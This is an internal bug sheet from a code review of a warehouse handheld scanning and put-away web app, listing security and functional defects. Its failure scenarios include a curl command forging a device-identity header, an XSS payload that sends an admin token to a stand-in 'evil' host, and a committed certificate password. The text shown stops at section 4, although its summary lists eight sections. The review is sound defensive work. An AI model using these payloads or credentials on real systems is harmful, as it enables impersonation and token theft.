# Zebra Handheld Scan & SPI Stage 04 Put-away — Bug Sheet

**Checked:** 2026-10-21 · **Branch:** `saas` (HEAD `1ba42fa8`) · **Method:** read-only code review of every Zebra / put-away / sticker / device file, frontend + backend + docs, end to end. No runtime execution, no DB writes (read-only SELECTs only — DB has 1 scan device: id 1, client 1, serial `26013524701106`, `enrolled_by` NULL).
**Scope:** device trust (mTLS cert, token, enroll) · handheld scan API · handheld scan screen + PWA · SPI Stage 04 desk backend · SPI Stage 04 desk frontend · Inventory scan simulation pages · location QR modals · docs

**Severity:** **S1** security / tenant leak / stock or data loss · **S2** flow blocked or wrong data saved · **S3** display / UX / minor
**Area:** **FE** frontend · **BE** backend · **INT** FE↔BE contract · **SEC** security · **DB** schema · **UI** layout / dark mode · **PWA** · **DOC**
**Status:** `Open` (confirmed in code) · `Plausible` (seen in code, depends on config / not reproduced)
**✔** = re-verified by hand during compilation (in addition to the reviewer's check)

**Path aliases**
| Alias | File |
|---|---|
| ScanCtl | `app/Http/Controllers/Api/P2p/SpiPutawayScanController.php` |
| DevCtl | `app/Http/Controllers/Api/ScanDeviceController.php` |
| AllocCtl / TaskCtl / PutCtl / BoxCtl | `app/Http/Controllers/Api/P2p/SpiPutawayAllocationController.php` / `SpiPutawayTaskController.php` / `SpiPutawayController.php` / `SpiBoxController.php` |
| Finder / Engine / LockSvc | `app/Services/Inventory/LocationFinderService.php` / `PutawaySuggestionEngine.php` / `LocationLockService.php` |
| Task model | `app/Models/P2p/SpiPutawayTask.php` |
| Scan.tsx / scan.css | `resources/js/pages/p2p/putaway/PutawayScan.tsx` / `resources/css/putaway-scan.css` |
| Devices.tsx | `resources/js/pages/inventory/InventoryScanDevices.tsx` |
| Step4 | `resources/js/pages/p2p/purchase-management/invoice/steps/Step4PutawayAllocation.tsx` |
| certs README / proxy | `storage/certs/README.md` / `storage/certs/tls-proxy.cjs` |

---

## Summary

| Section | Items | S1 | S2 | S3 |
|---|---|---|---|---|
| 1. Security — cross-cutting | 16 | 8 | 5 | 3 |
| 2. Device management & enrolment | 23 | 1 | 10 | 12 |
| 3. Handheld scan API (backend) | 26 | 1 | 7 | 18 |
| 4. Handheld scan screen + PWA (frontend) | 36 | 0 | 10 | 26 |
| 5. Stage 04 desk (backend) | 37 | 2 | 7 | 28 |
| 6. Stage 04 desk (frontend) | 43 | 3 | 12 | 28 |
| 7. Inventory simulation pages | 3 | 0 | 2 | 1 |
| 8. Docs | 1 | 0 | 0 | 1 |
| **Total** | **185** | **15** | **53** | **117** |

### Top 10 to fix first
1. **S4-F-01 / S4-F-02** — the desk Stage 04 screen never writes to the server. Placements, Zebra tasks and task codes exist only in React state, so **the handheld can never find a task**, and every "Putaway Completed" disappears on reload.
2. **SEC-01** — `X-Scan-Cert-CN` is trusted unconditionally in PHP. One header with the serial printed on the device makes you that handheld.
3. **SCN-B-01** — a location scan with no task returns **another tenant's** shelf / rack / zone names and box contents. The queries are unscoped `DB::table` calls.
4. **SEC-05 / 06 / 07** — sticker signing is cosmetic: the secret is shipped in the JS bundle, the "signature" is a 32-bit FNV fold, and unsigned `SH:41` / bare ids are accepted anyway.
5. **SEC-09** — stored XSS in the Suspend/Retire dialog. Any user can plant a script in a device label; it runs when an admin opens the dialog and can steal the admin's token.
6. **DEV-01 / S4-B-01** — no permission checks. Any logged-in user (HR, employee) can mint, rotate or retire devices and assign, confirm or cancel put-aways.
7. **S4-B-02** — `assign` re-checks no hard rule. Cold-chain, hazardous, over-weight and over-capacity boxes are accepted by the API.
8. **SEC-04** — serial is unique per client only, and the cert lookup is `->first()` across all clients.
9. **SCN-F-01 / 02** — after a put-away completes, the handheld is a dead end until reloaded.
10. **SEC-10** — the live pilot `.p12` password is committed in the certs README.

---

## 1. Security — cross-cutting

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| SEC-01 ✔ | SEC | PHP trusts `X-Scan-Cert-CN` unconditionally. There is no check that the request came through the TLS front door; `public/.htaccess` has no `RequestHeader unset`. | ScanCtl:656-663, 730-737; DevCtl:107-113 | S1 | Open | `curl -H "X-Scan-Cert-CN: zebra-26013524701106" http://<LAN-IP>/Cross_Border_Command/public/api/scan/putaway/session` acts as device 1 in client 1. You can then scan, confirm and complete put-aways as its enrolled user. The serial is printed on the handheld, shown on screen (Scan.tsx:619, 750, 908) and written in the README. |
| SEC-02 | SEC/DOC | The install doc runs `php artisan serve --host=0.0.0.0 --port=8001` and opens firewall port 8001, putting PHP on the LAN around the proxy. It contradicts README §10 (`127.0.0.1`) and §6.6. | `docs/p2p/PUTAWAY_APP_INSTALL.md` §4.2-4.4 | S1 | Open | SEC-01 works over plain `http://<ip>:8001` with no certificate. |
| SEC-03 | SEC | The prod ERP vhost guards scanner paths with a prefix regex `^/(ps/\|putaway-scan\|api/scan/)`. `/index.php/api/scan/...` does not match, but Laravel still routes it. The proxy's `needsDeviceCert()` has the same gap. | certs README:228-243 (§6.5); proxy:40-46 | S1 | Plausible | `https://kryptone.ai/index.php/api/scan/putaway/scan` with a forged CN header or a copied token works without any certificate. |
| SEC-04 | SEC/DB | Serial is unique per client only (`unique(['client_id','serial'])`). The cert lookup is `ScanDevice::where('serial',$serial)->first()` with no client filter and no ORDER BY. README §11 says "never create a second row with the same serial", but nothing enforces it. | migration `2026_10_12_000001`:33; ScanCtl:736; DevCtl:112 | S1 | Open | Client B registers client A's Zebra serial. A's handheld cert can resolve to B's row and run in B's tenant. Suspending A's row may not stop A's device. |
| SEC-05 ✔ | SEC | The sticker secret defaults to `'demo-signing-secret'`. `STICKER_SECRET` is in neither `.env` nor `.env.example`, and the same literal ships in the JS bundle. | `config/inventory.php`:21; `resources/js/pages/inventory/putAwayStore.ts`:85 | S1 | Open | Anyone can mint a "validly signed" BOX / SHELF / ZONE `/ps/` URL from the browser bundle. |
| SEC-06 | SEC | The "signature" is 32-bit FNV-1a over `body\|secret`, cut to 7 base36 characters. It is not an HMAC, and the secret comes after the body, so equal FNV states collide. | `app/Services/Inventory/StickerKey.php` sign()/fold() | S1 | Open | Labels can be forged even after a real secret is set. |
| SEC-07 | SEC | Unsigned short forms are accepted with `valid=true`: `SH:41`, `RC:7`, `ZN:14`, and bare digits (read as a box id). The signature only matters on labels that choose to be signed. | ScanCtl:787-797 | S1 | Open | Typing `1041` or `SH:41` is a valid scan. This also enables the enumeration in SCN-B-01. |
| SEC-08 | SEC/INT | The sticker's tenant segment (`CBC1.<tenant>…`) is parsed and then thrown away by `classify()`. It is never compared with `device->client_id`. | ScanCtl:771-783 | S2 | Open | Another company's label gets a misleading "unknown box" instead of "wrong company". Lookups are scoped, so there is no direct leak. |
| SEC-09 ✔ | SEC/FE | Stored XSS. The Swal `html:` interpolates `d.label` and `d.serial` unescaped. | Devices.tsx:104 | S1 | Open | Any user (see DEV-01) saves label `<img src=x onerror=fetch('//evil/'+localStorage.cbc_token)>`. When an admin clicks Suspend or Retire, the admin's Sanctum token is sent away. |
| SEC-10 ✔ | SEC/DOC | The README commits the live pilot `.p12` password (`Kryptone@2026`) and the prod device serial (commit `06caa558`). It also documents publishing the private-key bundle under the public web root, and keeping the prod CA private key on the app server. | certs README:323, 346-358, §9 | S2 | Open | With the repo plus a leaked or hosted `.p12`, anyone can install a working device cert. |
| SEC-11 | SEC | The proxy forwards the client's own `X-Forwarded-For` / `X-Forwarded-Host`, and Laravel trusts 127.0.0.1 and all private ranges. | `bootstrap/app.php`:55-61; proxy:73-90 | S2 | Open (local) / Plausible (prod) | `ip()` becomes attacker-chosen, so throttles are unlimited. `X-Forwarded-Host` poisons `url()`, signed URLs and links. |
| SEC-12 | SEC | The proxy strips only `x-scan-cert-cn`. The underscore variant `x_scan_cert_cn` passes through, and PHP's built-in server maps it to `HTTP_X_SCAN_CERT_CN`. | proxy:74 | S2 | Plausible (local `artisan serve` only; Apache/FPM drop underscore headers) | CN spoof when `REQUIRE_DEVICE_CERT=0`, or one cert-holding device impersonating another serial. |
| SEC-13 | SEC/INT | All public throttles share one per-IP counter. Laravel keys guest throttles on `sha1(domain\|ip)` regardless of route. | `routes/api.php`:80, 88, 102, 112 | S2 | Open | Zebras behind the warehouse NAT make 20+ scans a minute, and `/login` returns 429 for every desk user on that IP. All handhelds also share the 120/min. Locally everything through the proxy is 127.0.0.1, so it is one bucket for everyone. |
| SEC-14 | SEC | The device token is also read from `device_token` input, which includes the query string on `GET /scan/putaway/{task}`. | ScanCtl:663 | S3 | Open | The credential lands in access and proxy logs. |
| SEC-15 | SEC | The HTTP→HTTPS redirect builds `Location` from the client's `Host` header. | proxy:127-129 | S3 | Plausible | Open redirect / host injection on the LAN listener. |
| SEC-16 | SEC | `device-check` returns id, serial, label, location and status for any known token, including suspended or retired devices. Via the CN header it is also a serial oracle across tenants. | DevCtl:124-132 | S3 | Open | Enumerate serials and read other tenants' device labels and locations. |

---

## 2. Device management & enrolment

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| DEV-01 | SEC/BE | No permission check on `scan-devices` list / create / update / rotate / destroy / enroll; only `auth:sanctum, user.active, tenant`. Scope is client-wide, so branch users manage every branch's devices. The frontend route gate is temporarily `return true`, and the menu is shown to all tenant roles. | DevCtl:21-97; `routes/api.php`:1353-1358; `resources/js/utils/routeAccess.ts`:232-236; `resources/js/constants.ts`:553 | S1 | Open | An HR employee POSTs `/api/scan-devices` and gets a working device token. Or they rotate or retire every handheld and stop the floor. |
| DEV-02 | BE | The device's actor is checked only for existence and soft delete. `users.status`, client status and branch status are ignored; `EnsureUserActive` does not run on public routes. | ScanCtl:694-717 | S2 | Open | The enrolling employee leaves and is deactivated, or the client's plan lapses. The handheld keeps placing stock in that person's name. |
| DEV-03 | BE | `enroll` overwrites `enrolled_by` on every call. There is no "already claimed" guard and no audit. | DevCtl:147-173 | S2 | Open | Anyone in the client with the device token re-binds it to themselves. That changes the author of all future put-aways and the branch scope. |
| DEV-04 | FE/INT | Auto-claim binds whoever is logged in on the handheld the first time, and `claimed=true` then blocks re-binding. | Scan.tsx:447-463 | S2 | Open | An admin logs in on the Zebra to set it up. Every later shift's put-aways are authored by the admin. |
| DEV-05 | INT | The claim call uses the shared axios client. A 401 runs the interceptor, which wipes `cbc_token` and calls `location.replace('/login')`, despite the "silent on failure" comment. | Scan.tsx:456; `resources/js/api.ts`:203-233 | S2 | Open | An expired user token on the handheld kicks the operator off the scan screen mid put-away. |
| DEV-06 | FE | The claim effect depends on `state?.device`, which is a new object on every response, so a failing claim re-posts after every scan. | Scan.tsx:447 | S3 | Open | For an unclaimed device whose claim fails (404 from another client, 422 for a super-admin), every scan also POSTs `/scan-devices/enroll`. That eats the throttle and repeats the DEV-05 risk. |
| DEV-07 | INT | Cert-only devices can never be claimed: `enroll` requires a token, and the page returns early with no token. README §1 promises "no token, no login, no enrolment link". | DevCtl:149; Scan.tsx:452 | S2 | Open | Every put-away falls back to `created_by` (the desk admin). This is the current DB state of device 1. |
| DEV-08 | INT | The admin's enroll QR points at `/s/enroll#token`, which is the **demo** ScanLanding. It stores the token and calls device-check only; it never calls `/scan-devices/enroll`, yet it shows "Handheld enrolled". | putAwayStore.ts:284-287; `resources/js/pages/inventory/ScanLanding.tsx`:41-60 | S2 | Open | The admin believes the device is signed to an operator; `enrolled_by` stays NULL. The install doc (§6.3-6.4) describes `/putaway-scan/enroll` instead. |
| DEV-09 | INT | On prod the scan vhost 302-redirects `/s/...` to `/putaway-scan`. The fragment survives, but PutawayScan reads the hash only when the path ends in `/enroll`. | certs README §6.4; Scan.tsx:212 | S2 | Open (per documented vhost) | Scanning the enroll QR on prod installs no token, and the device shows "blocked". |
| DEV-10 | INT | `STICKER_URL` is not set locally, so the enroll QR and labels encode `http://localhost/Cross_Border_Command/public/...`. | `.env` | S2 | Open | On the handheld, `localhost` is the handheld itself, so enrolling from a local admin screen cannot work. |
| DEV-11 | SEC | The device token never expires, and the same token is the enroll secret shown in the QR and "Copy link". There is no single-use enroll code. | `app/Models/ScanDevice.php`:44-56; Devices.tsx:295-313 | S2 | Open | A photo of the admin screen or a clipboard read gives a permanent `X-Scan-Device` credential. |
| DEV-12 | DB/BE | `enrolled_by` has no FK. When the enrolling user is deleted, `actorId()` still returns the dead id instead of falling back to `created_by`. | migration `2026_10_16_000002`:67-69; ScanDevice.php:35 | S2 | Open | The user is deleted → `device_unclaimed` 403 → the handheld stops working. |
| DEV-13 | UI/INT | The Rotate dialog says "The device cannot scan again until the new one is installed". That is false for cert-identified devices, because the CN path ignores the token. | Devices.tsx:125; DevCtl:83 | S3 | Open | The admin rotates to lock out a lost device and it keeps scanning. |
| DEV-14 | UI | The Suspend/Retire dialog says "Any put-away run in progress on it will be discarded", but `update()` only changes the status. | Devices.tsx:106 | S3 | Open | Open tasks remain; the message misleads. |
| DEV-15 | BE | `toClient()` sends `created_at` as `enrolled_at`. The real `enrolled_at` / `enrolled_by` are never exposed. | ScanDevice.php:68 | S3 | Open | The admin cannot see which user a device acts as. |
| DEV-16 | BE | `update` cannot clear the branch: `array_filter(!== null)` drops `{branch:null}`. An empty label becomes null and gets the 422 "must be a string". | DevCtl:77-78 | S3 | Open | The location can never be emptied; the error is confusing. |
| DEV-17 | BE | No `whereNumber` on the `scan-devices/{id}` routes, while the handlers take `int $id`. | `routes/api.php`:1353-1355 | S3 | Open | `PUT /api/scan-devices/abc` or `PUT /scan-devices/enroll` → TypeError 500 instead of 404. |
| DEV-18 | BE | Serial is matched case- and format-sensitively, with no charset rule or normalisation (Postgres compares case-sensitively). | DevCtl:39, 111 | S3 | Plausible | Serial saved as `nfz…` vs CN `zebra-NFZ…` → 401 "not authorised" with no hint. |
| DEV-19 | FE | Every server validation error is shown under the Serial field. | Devices.tsx:94 | S3 | Open | A label max:120 error appears under Serial. |
| DEV-20 | UI | Retire uses a trash icon, but `destroy` is never called from the UI. Retired devices show "Reactivate", so retired is not terminal. | Devices.tsx:214-223 | S3 | Open | Users think the device was deleted. |
| DEV-21 | FE | The "This handheld" badge needs the token in the ERP origin's localStorage plus device-check, which is denied on the ERP host. | Devices.tsx:60, 194 | S3 | Open | Dead feature on prod. |
| DEV-22 | FE | A malformed enroll fragment makes `decodeURIComponent` throw inside an async function with no try; the phase stays `checking`, which renders null. | ScanLanding.tsx:42 | S3 | Open | A bad `%` in the link → blank page forever. |
| DEV-23 | FE | An enrollment link overwrites a good stored token during render without verifying it, and `RUN_KEY` is not cleared. The key string is duplicated instead of imported. | Scan.tsx:210-222 | S3 | Open | Opening a stale or wrong link breaks a working handheld. |

---

## 3. Handheld scan API (backend)

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| SCN-B-01 ✔ | SEC/BE | **Cross-tenant read.** `nameLocation`, `locationDetails`, `locationChildren` and `locationContents` use raw `DB::table('inventory_*')` / `inventory_location_occupancy` with no `client_id` filter. `nameLocation` ignores its `$device` argument. | ScanCtl:456-500, 829-842, 956-1019, 1056-1060, 1100-1104 | S1 | Open | A device from client A scans `SH:<id>` with no task. It gets client B's warehouse, zone and rack names, dimensions, child shelves, and every box code, weight and date on the shelf. With sequential ids and unsigned short forms (SEC-07), all of B's storage can be listed at 120 requests/min. |
| SCN-B-02 | SEC/BE | The client-supplied `staged_location` is only compared with the task's shelf/zone id, which the server itself returns in `state().destination.shelf_id`. Nothing proves the shelf was scanned, and `locationUsable()` is skipped. | ScanCtl:402-419, 1298 | S2 | Open | Post a box scan with `staged_location = destination.shelf_id`. `shelf_confirmed_at` is stamped and the box is auto-placed with nobody at the shelf. Inactive shelves are accepted too. |
| SCN-B-03 | BE | The rack-first (trolley) flow always fails. The no-task location scan accepts a `rack`, but on the box scan `locationSlot()` can only be `shelf` or `zone`, so `kindOk` is false. The same happens for a staged zone on a racked task. | ScanCtl:403-413 vs 456-531 | S2 | Open | Every box listed as "due here" is refused with `wrong_location` and counts as a strike; three strikes reset the task. |
| SCN-B-04 | BE | The stale-scan reset runs only for a carried `task_id`. A box scan that finds the open task itself never calls `dropStaleScans`. Only the box scan records `device_id`. | ScanCtl:133-137, 398-428 | S2 | Open | Shelf X is scanned and the operator walks away. Hours later another handheld scans the box anywhere, the old `shelf_scan_at` is reused, and the box is committed at X with no fresh proof. |
| SCN-B-05 | BE | Task expiry is never enforced. Nothing writes `SpiPutawayTask::EXPIRED` (no reaper or command), `findTask` / `complete` ignore `expires_at`, and the shelf lock expires at the task deadline. | ScanCtl:226-236, 739-762; Task model:45, 89-97; TaskCtl:118, 131-135 | S2 | Open | A 1-hour task is completed two days later, after someone else took the freed shelf. Expired tasks also block `assign` and `confirm-manual` forever. |
| SCN-B-06 | BE/DB | `commit()` checks `isOpen()` / `isPlaced()` before `DB::beginTransaction()`, and neither the task nor the row is loaded `lockForUpdate`. | ScanCtl:163-167, 246-327 | S2 | Open | A double trigger, two handhelds, or a timeout retry: both requests pass and both run `occupy()`, producing two CONFIRMED_DEVICE rows and two `putaway_confirmed` SPI logs. A desk Cancel landing in between gets overwritten from `cancelled` to `scanned`. Capacity is not double-counted, because counters are recomputed. |
| SCN-B-07 | BE | Locks are released **by location, not by holder**. `held(type,id)`, `releaseLockFor()` and task store/cancel act on whatever lock is live on that shelf, with no `held_for_type/id` check. | ScanCtl:1206-1210; AllocCtl:514-518; LockSvc:125-133; TaskCtl:131-137, 357-361 | S2 | Open | User U's lock expires and user V locks SH-5 for box C. Completing U's old task, or U's manual confirm, releases V's lock mid-assignment. With the same user and two boxes on one shelf, confirming the first drops the hold on the second. |
| SCN-B-08 | BE | `commit()` saves `box_confirmed_at` / `shelf_confirmed_at` outside the transaction, before the "row gone" / "already placed" / no-occupancy exits. The 409 response has no `code` and no `data`. | ScanCtl:254-273 | S2 | Open | After a 409 the task says `ready_to_complete=true`. Every later scan auto-commits into the same 409, and the page still says "scan the shelf". The only way out is three deliberate bad scans. |
| SCN-B-09 | BE | `resetScans()` clears the shelf and box scans but leaves `zone_scan_at` / `rack_scan_at`. | Task model:275-286 | S3 | Open | After a 3-strike or stale reset, the chain still shows Zone ✓ / Rack ✓ and the next step skips them. The stale `rack_scan_at` re-triggers the "earlier scan timed out" notice and adds repeated `stale_reset` rows. |
| SCN-B-10 | BE | Refusals with no task are never logged: both log branches require `$task`. This contradicts the docblock "every outcome writes an activity row". | ScanCtl:108-110, 603-627 | S3 | Open | `bad_signature`, `unreadable`, `unknown_box` and `no_task` probes (including SCN-B-01 enumeration) leave no trace. |
| SCN-B-11 | DB | `p2p_spi_scan_logs` is never written by the Zebra path; only legacy PutCtl:492 writes it. | ScanCtl (uses `PutawayActivityLog` only) | S3 | Open | Any report built on scan logs shows zero Zebra activity. |
| SCN-B-12 | BE | `commit()` uses `liveFor(box)` without comparing it with `$task->occupancy_id` or the task's shelf/zone. | ScanCtl:266 | S3 | Plausible | If any other path moves the occupancy, the box is placed where the occupancy points, not where it was scanned. |
| SCN-B-13 | BE | A soft-deleted put-away row or box leaves the task open forever. For a soft-deleted SPI, `$task->invoice` is null and the SPI log is silently skipped while the box is still placed. | ScanCtl:259-260, 309, 334 | S3 | Open | Ghost pending tasks in the queue; a missing SPI history entry. |
| SCN-B-14 | BE | Re-scanning an already-scanned location (trigger bounce or network retry) returns `already_scanned` 422 and counts as a strike. | ScanCtl:533-536 | S3 | Open | Three bounces wipe the operator's progress. |
| SCN-B-15 | BE | Retrying the final box scan after an auto-commit drops the closed task and answers `already_placed` with `status:false`. | ScanCtl:133-134, 360-375 | S3 | Open | The handheld shows an error for a placement that succeeded. |
| SCN-B-16 | BE | `confirm` accepts `slot=zone` on a shelf task (it maps to the shelf columns), and its messages say "Scan the zone". The endpoint is effectively dead: `commit()` auto-runs once both scans exist, so the "press Complete" step is unreachable through `scan()`. | ScanCtl:196-203; Task model `stepLabel` | S3 | Open | Wrong prompts; dead API surface. |
| SCN-B-17 | BE | A valid signed `WAREHOUSE` label maps to kind null and gets the `unreadable` message. | ScanCtl:146, 776-777 | S3 | Open | Operator sees "That is not a Cross Border label." for our own warehouse label. |
| SCN-B-18 | BE | The comment promises "a typed code", but `classify()` has no path for printed codes. | ScanCtl:765-800 | S3 | Open | Typing `RC-001-SH-12` from a damaged label → `unreadable`. |
| SCN-B-19 | BE | A carried `task_id` that is no longer visible (the actor's branch scope changed) makes `findTask` abort with 404, despite the "lenient" comment. | ScanCtl:133, 741-744 | S3 | Open | Every scan 404s until the handheld's storage is cleared. |
| SCN-B-20 | SEC | `wrong_location` / `no_task` messages name a rack or shelf code through the unscoped `nameLocation`. | ScanCtl:355-358, 412, 559-565 | S3 | Open | Another tenant's location codes appear in error text. |
| SCN-B-21 | BE | Response shapes are inconsistent: the 409 has no `code` / `data`, `validate()` 422s use Laravel's default shape, `reject()` has no `code`, the findTask 404 has no `code`, and the commit success lacks `spi_putaway_progress` (which desk `confirmManual` returns). | ScanCtl:116, 270-273, 640-646, 744 | S3 | Open | The handheld cannot branch reliably on the error type. |
| SCN-B-22 | BE | `completed_scans` stays 0 until commit, which sets it to `required_scans`. | ScanCtl:287-292 | S3 | Open | Progress shows 0/2 during the whole scan. |
| SCN-B-23 | BE | `commit()` sets only `status`, `confirmed_*` and `verify_method` on the put-away row. `scanned_by`, `device_serial` and `*_scanned_at` are never written. | ScanCtl:278-283 | S3 | Open | Desk views show blank scanner/device for Zebra placements. |
| SCN-B-24 | BE | `location.boxes[].since` is a raw DB string with no timezone; everything else is ISO-8601. | ScanCtl:1130 | S3 | Open | Wrong time shown for non-UTC viewers. |
| SCN-B-25 | BE | N+1: `describe()` makes 3-5 queries per task plus 2 for the shelf name, `state()` repeats them, and each rack child calls `nameLocation`. | ScanCtl:70-84, 1076, 1176-1184, 1290-1299 | S3 | Open | `session()` with 50 tasks ≈ 300+ queries over warehouse wifi. |
| SCN-B-26 | BE | Dead or stale code: `SpiPutawayTask::nextScan()` is unused; `'putaway_code' => 'PUT-'.box_code` is a made-up code that matches no record; due tasks are capped at 25 with no "more" flag. | Task model; ScanCtl:478, 1260 | S3 | Open | Counts are wrong past 25 due tasks; a fake reference is shown. |

---

## 4. Handheld scan screen + PWA (frontend)

> The page has **no camera code** (no getUserMedia / BarcodeDetector); input is keyboard wedge only. A phone "scan" is the phone camera app opening a `/ps/<key>` URL. `npx tsc` shows no errors in these files.

| ID | Area | Bug | Where | Sev | Status | Failure scenario |
|---|---|---|---|---|---|---|
| SCN-F-01 ✔ | FE | After a put-away completes, the `placed \|\| done` card renders no input and no button. The keydown refocus finds no `inputRef`. The comment says "the trigger navigates on its own", which is only true for a phone camera. | Scan.tsx:673-690, 517 | S2 | Open | On a Zebra the next box's scan is typed into nothing; the operator must reload. |
| SCN-F-02 ✔ | FE | The `<Done onNext>` "Next box" screen is unreachable: its `if (done)` sits after the earlier `if (placed \|\| done)` return. | Scan.tsx:722-730, 1143-1155 | S2 | Open | The intended "Next box" path, and its `writeRun(null)`, never runs. |
| SCN-F-03 | FE/INT | The server returns `step:'lookup'`, which is not in the `Step` type. `step.startsWith('scan')` is false, and line 1114 also requires `!state.location`, so no input is rendered. | Scan.tsx:659, 1095, 1114; ScanCtl:492-499 | S2 | Open | Scanning a location with nothing due removes the scan field; every later scan is lost until reload. |
| SCN-F-04 | FE | When the first scan via `/ps/:scanKey` is refused (`no_task`, `unknown_box`, `unreadable`, `bad_signature`), `data:null` leaves `state` null. The only button, "Try again", re-posts the same scan. | Scan.tsx:411-426, 587-607 | S2 | Open | A "Could not start" dead end with no scan input. |
| SCN-F-05 | INT | App-wide `SettingsProvider` calls `api.get('/settings')` on the scanner page whenever `cbc_token` exists. | App.tsx:855-863; `SettingsContext.tsx`:113-141 | S2 | Plausible (race with AuthContext `/me`) | A stale token → 401 → interceptor redirects the handheld to /login. |
| SCN-F-06 | INT | Old `/s/` sticker URLs (StickerKey says they are still on racks) opened by a phone land in the demo ScanLanding. It runs local `ingestScan` on sample data, shows "Scan accepted" and bounces to /inventory. | App.tsx:801-808; ScanLanding.tsx:62-65; StickerKey.php:30-41 | S2 | Open | The operator thinks the put-away was recorded; nothing reached the API. |
| SCN-F-07 | FE | The input is `disabled={busy}` for the whole request (up to the 15 s timeout), with no buffer or queue and no feedback. | Scan.tsx:517, 650, 715 | S2 | Open | The next trigger pull during a slow request is silently lost. |
| SCN-F-08 | FE | The auto-submit regex's last group matches after the first signature character, so a pause over 120 ms submits a truncated key. | Scan.tsx:533-541 | S2 | Plausible | A DataWedge inter-character delay or Bluetooth HID → `bad_signature` → a strike. |
| SCN-F-09 | INT | There is no reconcile after a 15 s abort; the server may already have committed. | Scan.tsx:244-270, 559 | S2 | Plausible | The operator re-scans the location → `already_scanned` strike → three strikes reset the task. |
| SCN-F-10 | INT | The device token and run state live in per-origin localStorage. | Scan.tsx:115, 127; putAwayStore.ts:286 | S2 | Plausible | Enrolled on `kryptone.ai` but opened on `www.kryptone.ai` (or IP vs name) → "Device blocked". |
| SCN-F-11 | FE | `chainRef` starts as `''` and the proved chain is `[]`, so `sameAsBefore` is true on the first box scan. | Scan.tsx:294-311 | S3 | Open | The toast reads "That already scanned" (ungrammatical, and wrong) instead of "B-001 · TASK-x". |
| SCN-F-12 ✔ | FE/UI | A just-finished put-away says "Put-away **already** completed", and the tick sits on a red `--pw-bad` background. The success toast isn't rendered in that branch. | Scan.tsx:677-678; scan.css:241-253 | S3 | Open | Good news looks like an error. |
| SCN-F-13 | FE | `notice` is never rendered, so "This handheld is now signed to you" is invisible. `attempts_left` is never displayed. | Scan.tsx:188, 289, 460 | S3 | Open | The 3-strike wipe arrives with no warning. |
| SCN-F-14 | INT | Commit returns `message` without `notice`, so the page falls back to the generic text. | Scan.tsx:558; ScanCtl:318-321 | S3 | Open | Shows "Scan accepted." instead of the placement confirmation. |
| SCN-F-15 | FE | A non-JSON 500/502 parses to `{}`. | Scan.tsx:275, 366 | S3 | Open | Shows "Scan not accepted". With APP_DEBUG on, the exception text is shown to the operator. |
| SCN-F-16 | FE | `readRun()` is used only on `/ps/`. On `/putaway-scan` a reload sends `task_id:null`. | Scan.tsx:428-431 | S3 | Open | After a reload mid-task the shelf scan becomes a lookup, and the box must be re-scanned. |
| SCN-F-17 | FE | The `/ps/<key>` URL is never replaced after use. | Scan.tsx:411-424 | S3 | Open | Reload or Back replays the scan; a wrong-location replay adds a strike. |
| SCN-F-18 | FE | No `inputMode="none"`, and the input is refocused on every state change, including behind an open ProductSheet. | Scan.tsx:497-499, 643, 705 | S3 | Open | The soft keyboard covers half the TC27 screen on every scan. |
| SCN-F-19 | FE | Short codes, bare ids and URL labels with `?` or a trailing `/` never auto-submit. | Scan.tsx:535 | S3 | Open | With no DataWedge Enter suffix, the scan sits in the field. |
| SCN-F-20 | FE | For `device_unclaimed` the server says "open the enrollment link and sign in", but the card says "ask an administrator". There is no retry, and the keydown listener is removed. | Scan.tsx:512, 574-585 | S3 | Open | A fixed device needs a manual reload. |
| SCN-F-21 | FE | In lookup mode, reserved boxes render as tappable "Pending" rows. | Scan.tsx:1043-1054 | S3 | Open | Every tap returns `no_task`. |
| SCN-F-22 | FE | No `navigator.onLine` / `online` listener and no retry. | Scan.tsx:244-270 | S3 | Open | A wifi drop shows "Could not reach the server" and the scan must be redone. |
| SCN-F-23 | FE | No audio or `navigator.vibrate`, despite the comment that "a refusal has to reach someone looking at a carton". | Scan.tsx (whole file) | S3 | Open | Refusals are missed on the floor. |
| SCN-F-24 | UI | Three columns at 360 px leave about 74 px per cell. | scan.css:741-744 | S3 | Open | `RC-001-SH-12` (about 94 px in 13 px mono) is cut off with an ellipsis; that is the most important code on screen. |
| SCN-F-25 | UI | Touch targets are under 44-48 px: tabs about 31 px, the sheet ✕ about 28 px. | scan.css:502-514, 785 | S3 | Open | Hard to hit with gloves. |
| SCN-F-26 | UI | The fixed bottom toast (z-index 60) sits over the scan field and the Complete button for 3-6 s. | scan.css:553-571 | S3 | Plausible | A tap meant for Complete dismisses the toast instead. |
| SCN-F-27 | UI | The cookie banner (z-index 9999, fixed bottom) renders on the scanner when privacy.cookie is on. | App.tsx:861; `CookieBanner.tsx`:35 | S3 | Plausible | It covers the scan field and the toast. |
| SCN-F-28 | FE | Small rendering glitches. | Scan.tsx:618, 634, 833 | S3 | Open | "… 8 °C" when min is null; "TASK · " when `spi_code` is null; blank label. |
| SCN-F-29 | A11y | Accessibility gaps: the toast is inserted pre-filled and mixes `role=status` with `aria-live=assertive`; the clickable toast `div` can't be reached by keyboard; there is no tabpanel; the dialog has no Esc or focus trap; the input has no label. | Scan.tsx:643, 735-745, 1012, 1184-1188 | S3 | Open | Screen readers and keyboard users can't follow the flow. |
| SCN-F-30 | FE | No i18n; all text is hard-coded English. | Scan.tsx | S3 | Open | Floor staff who read Hindi or Marathi get English only. |
| SCN-F-31 | FE | Opening a task uses `window.location.href`, a full reload of the SPA bundle, instead of `navigate()`. | Scan.tsx:631 | S3 | Open | Slow over warehouse wifi. |
| SCN-F-32 | FE | Dead code: the reset block is duplicated (387-390 and 394-398); the `confirm_*` Step types, `expected`, `required_scans` and `due_here` are unused; `'lookup'` is cast as `Step`. | Scan.tsx | S3 | Open | Cleanup only. |
| SCN-F-33 | UI | Dead CSS (`.pwscan-items`, `-dest`, `-chain`, `-rung*`, `-note*`, `-placed*`, `-loc3-full`, `-alert--ok`, `-done*`). `.pwscan-done` reads `--pw-bg`, which is defined only inside `.pwscan`. | scan.css | S3 | Open | Cleanup; the done screen would be unstyled if it were ever reached. |
| SCN-F-34 | PWA | `images/igc-logo.png` is 750×240 but declared as 192×192 and 512×512 (including maskable). The IGC branding is hard-coded in a multi-tenant app. | `public/manifest.json`:11-14 | S3 | Open | Chrome flags the icon or crops it on install; other tenants see IGC. |
